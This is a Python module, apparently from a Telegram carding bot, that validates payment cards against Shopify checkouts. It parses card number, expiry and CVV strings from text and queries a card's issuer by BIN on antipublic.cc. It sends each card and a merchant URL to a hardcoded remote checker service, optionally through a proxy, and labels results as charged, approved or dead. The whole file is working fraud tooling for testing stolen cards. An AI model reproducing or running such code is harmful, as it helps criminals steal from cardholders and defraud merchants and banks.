"""Pure async helpers extracted from bot_cc_legacy.py (Shopify direct-API gate).

This module contains NO telethon / no bot client — safe to import without
triggering a competing Telegram polling session.
"""
import asyncio
import json
import re

import aiohttp

CHECKER_API_URL = "http://108.165.12.183:8081/"

_DEAD_INDICATORS = (
    "receipt id is empty", "handle is empty", "product id is empty",
    "tax amount is empty", "payment method identifier is empty",
    "invalid url", "error in 1st req", "error in 1 req",
    "cloudflare", "connection failed", "timed out",
    "access denied", "tlsv1 alert", "ssl routines",
    "could not resolve", "domain name not found",
    "name or service not known", "openssl ssl_connect",
    "empty reply from server", "httperror504", "http error",
    "timeout", "unreachable", "ssl error",
    "502", "503", "504", "bad gateway", "service unavailable",
    "gateway timeout", "network error", "connection reset",
    "failed to detect product", "failed to create checkout",
    "failed to tokenize card", "failed to get proposal data",
    "submit rejected", "handle error", "http 404",
    "url rejected", "malformed input", "amount_too_small",
    "site dead", "captcha_required", "captcha required", "site errors", "failed",
    "all products sold out", "no_session_token", "tokenize_fail",
)


def is_dead_site_error(msg: str) -> bool:
    if not msg:
        return True
    low = str(msg).lower()
    return any(k in low for k in _DEAD_INDICATORS)


def extract_cards(text: str):
    """Find every card in `card|mm|yy|cvv` format inside an arbitrary blob."""
    pattern = r"(\d{15,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})"
    out = []
    for n, mm, yy, cvv in re.findall(pattern, text):
        if len(yy) == 2:
            yy = "20" + yy
        out.append(f"{n}|{mm.zfill(2)}|{yy}|{cvv}")
    return out


async def get_bin_info(card_number: str):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as res:
                if res.status != 200:
                    return "-", "-", "-", "-", "-", ""
                txt = await res.text()
                try:
                    data = json.loads(txt)
                    return (
                        data.get("brand", "-"),
                        data.get("type", "-"),
                        data.get("level", "-"),
                        data.get("bank", "-"),
                        data.get("country_name", "-"),
                        data.get("country_flag", ""),
                    )
                except json.JSONDecodeError:
                    return "-", "-", "-", "-", "-", ""
    except Exception:
        return "-", "-", "-", "-", "-", ""


async def check_card(card: str, site: str, proxy: str | None = None) -> dict:
    """Check a single card against `site` via the direct API."""
    try:
        parts = card.split("|")
        if len(parts) != 4:
            return {"status": "Invalid Format", "message": "Invalid card format", "card": card}

        params = {"cc": card, "url": site}
        if proxy:
            params["proxy"] = proxy

        timeout = aiohttp.ClientTimeout(total=120)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API_URL, params=params) as resp:
                raw = await resp.json(content_type=None)

        response_msg = raw.get("Response", "")
        price = raw.get("Price", "-")
        gate = raw.get("Gate", "shopify")
        status = raw.get("Status", "")

        if is_dead_site_error(response_msg):
            return {"status": "Site Error", "message": response_msg, "card": card,
                    "retry": True, "gateway": gate, "price": price}

        rl = response_msg.lower()
        if status == "Charged" or "order completed" in rl or "💎" in response_msg:
            return {"status": "Charged", "message": response_msg, "card": card,
                    "site": site, "gateway": gate, "price": price}
        if "thank you" in rl or "payment successful" in rl:
            return {"status": "Charged", "message": response_msg, "card": card,
                    "site": site, "gateway": gate, "price": price}
        approved_keys = (
            "approved", "success",
            "insufficient_funds", "insufficient funds",
            "invalid_cvv", "incorrect_cvv", "invalid_cvc", "incorrect_cvc",
            "invalid cvv", "incorrect cvv", "invalid cvc", "incorrect cvc",
            "incorrect_zip", "incorrect zip",
        )
        if status == "Approved" or any(k in rl for k in approved_keys):
            return {"status": "Approved", "message": response_msg, "card": card,
                    "site": site, "gateway": gate, "price": price}
        return {"status": "Dead", "message": response_msg, "card": card,
                "site": site, "gateway": gate, "price": price}

    except asyncio.TimeoutError:
        return {"status": "Site Error", "message": "Request timeout", "card": card, "retry": True}
    except Exception as e:
        msg = str(e)
        if is_dead_site_error(msg):
            return {"status": "Site Error", "message": msg, "card": card, "retry": True}
        return {"status": "Dead", "message": msg, "card": card, "gateway": "Unknown", "price": "-"}
